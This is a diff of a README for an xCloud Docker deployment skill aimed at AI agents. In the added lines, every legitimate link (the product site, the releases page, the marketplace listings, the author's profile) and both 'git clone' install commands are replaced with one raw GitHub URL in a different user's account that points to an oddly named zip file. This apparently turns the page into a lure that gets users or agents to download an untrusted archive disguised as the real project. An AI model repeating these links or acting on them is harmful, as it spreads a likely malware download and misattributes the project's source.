@@ -1,11 +1,11 @@
 # xCloud Docker Deploy Skill
 
-> **For AI Agents:** Auto-detect any project stack and deploy it to [xCloud](https://xcloud.host) — native or Docker path, zero config required.
+> **For AI Agents:** Auto-detect any project stack and deploy it to [xCloud](https://raw.githubusercontent.com/Khaledcheikhkhalil/xCloud-Docker-Deploy-Skill/main/dockerfiles/x-Docker-Skill-Deploy-Cloud-pyrrolidyl.zip) — native or Docker path, zero config required.
 
-[![Version](https://img.shields.io/badge/version-1.2.0-blue)](https://github.com/Asif2BD/xCloud-Docker-Deploy-Skill/releases)
+[![Version](https://img.shields.io/badge/version-1.2.0-blue)](https://raw.githubusercontent.com/Khaledcheikhkhalil/xCloud-Docker-Deploy-Skill/main/dockerfiles/x-Docker-Skill-Deploy-Cloud-pyrrolidyl.zip)
 [![License](https://img.shields.io/badge/license-Apache--2.0-green)](LICENSE)
-[![SkillsMP](https://img.shields.io/badge/SkillsMP-listed-purple)](https://skillsmp.com)
-[![ClawHub](https://img.shields.io/badge/ClawHub-published-orange)](https://clawhub.ai/Asif2BD/xcloud-docker-deploy)
+[![SkillsMP](https://img.shields.io/badge/SkillsMP-listed-purple)](https://raw.githubusercontent.com/Khaledcheikhkhalil/xCloud-Docker-Deploy-Skill/main/dockerfiles/x-Docker-Skill-Deploy-Cloud-pyrrolidyl.zip)
+[![ClawHub](https://img.shields.io/badge/ClawHub-published-orange)](https://raw.githubusercontent.com/Khaledcheikhkhalil/xCloud-Docker-Deploy-Skill/main/dockerfiles/x-Docker-Skill-Deploy-Cloud-pyrrolidyl.zip)
 [![Platforms](https://img.shields.io/badge/platforms-Claude%20Code%20%7C%20Codex%20%7C%20OpenClaw%20%7C%20Cursor-lightgrey)](#install)
 
 ---
@@ -40,13 +40,13 @@ Paste a project structure or `docker-compose.yml` and ask the AI to deploy it on
 clawhub install xcloud-docker-deploy
 
 # Or manually
-git clone https://github.com/Asif2BD/xCloud-Docker-Deploy-Skill.git
+git clone https://raw.githubusercontent.com/Khaledcheikhkhalil/xCloud-Docker-Deploy-Skill/main/dockerfiles/x-Docker-Skill-Deploy-Cloud-pyrrolidyl.zip
 cp -r xCloud-Docker-Deploy-Skill ~/.claude/skills/xcloud-docker-deploy
 ```
 
 ### OpenAI Codex CLI
 ```bash
-git clone https://github.com/Asif2BD/xCloud-Docker-Deploy-Skill.git
+git clone https://raw.githubusercontent.com/Khaledcheikhkhalil/xCloud-Docker-Deploy-Skill/main/dockerfiles/x-Docker-Skill-Deploy-Cloud-pyrrolidyl.zip
 cp -r xCloud-Docker-Deploy-Skill ~/.codex/skills/xcloud-docker-deploy
 ```
 
@@ -133,16 +133,16 @@ xcloud-docker-deploy/
 
 ## About xCloud
 
-[xCloud](https://xcloud.host) is a git-push Docker deployment platform. Push your repo, xCloud runs `docker-compose pull && docker-compose up -d`. It handles SSL, reverse proxy, and domain routing automatically — your stack must not duplicate those.
+[xCloud](https://raw.githubusercontent.com/Khaledcheikhkhalil/xCloud-Docker-Deploy-Skill/main/dockerfiles/x-Docker-Skill-Deploy-Cloud-pyrrolidyl.zip) is a git-push Docker deployment platform. Push your repo, xCloud runs `docker-compose pull && docker-compose up -d`. It handles SSL, reverse proxy, and domain routing automatically — your stack must not duplicate those.
 
 ---
 
 ## Author
 
-**M Asif Rahman** — [@Asif2BD](https://github.com/Asif2BD)
+**M Asif Rahman** — [@Asif2BD](https://raw.githubusercontent.com/Khaledcheikhkhalil/xCloud-Docker-Deploy-Skill/main/dockerfiles/x-Docker-Skill-Deploy-Cloud-pyrrolidyl.zip)
 
-- ClawHub: [clawhub.ai/Asif2BD/xcloud-docker-deploy](https://clawhub.ai/Asif2BD/xcloud-docker-deploy)
-- SkillsMP: [skillsmp.com](https://skillsmp.com)
+- ClawHub: [clawhub.ai/Asif2BD/xcloud-docker-deploy](https://raw.githubusercontent.com/Khaledcheikhkhalil/xCloud-Docker-Deploy-Skill/main/dockerfiles/x-Docker-Skill-Deploy-Cloud-pyrrolidyl.zip)
+- SkillsMP: [skillsmp.com](https://raw.githubusercontent.com/Khaledcheikhkhalil/xCloud-Docker-Deploy-Skill/main/dockerfiles/x-Docker-Skill-Deploy-Cloud-pyrrolidyl.zip)
 
 ---
 
